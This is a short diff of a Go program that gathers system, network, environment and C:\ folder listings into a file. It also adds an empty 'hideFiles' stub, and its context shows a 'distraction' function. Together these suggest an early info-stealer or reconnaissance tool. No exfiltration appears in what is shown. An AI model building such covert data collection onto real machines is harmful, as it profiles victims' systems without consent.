@@ -13,6 +13,7 @@ package main
 
 import (
 	"fmt"
+	"io/ioutil"
 	"os"
 	"os/exec"
 	"reflect"
@@ -36,18 +37,22 @@ func saveAllInfo() {
 	system := sysGrab()
 	environment := envGrab()
 	network := netGrab()
-	folders := foldersGrab()
+	folders := folderGrab()
 
 	f.WriteString("[SYSTEM INFO]\n" + system + "\n\n")
 	f.WriteString("[NETWORK INFO]\n" + network + "\n\n")
 	f.WriteString("[ENVIRONMENT INFO]\n" + environment + "\n\n")
-	f.WriteString("[LOCAL FOLDERS]\n" + folders + "\n\n")
+	f.WriteString("[FOLDER INFO]\n" + folders + "\n\n")
 
 	if err != nil {
 		fmt.Println(err)
 		f.Close()
 		return
 	}
+}
+
+func hideFiles() {
+
 }
 
 func distraction() {
@@ -113,8 +118,15 @@ func envGrab() string {
 	return envoInfo
 }
 
-func foldersGrab() string {
+func folderGrab() string {
 	var envoInfo string
+
+	files, err := ioutil.ReadDir("C:\\")
+	if err != nil {
+	}
+	for _, f := range files {
+		envoInfo += f.Name() + "\n"
+	}
 
 	return envoInfo
 }
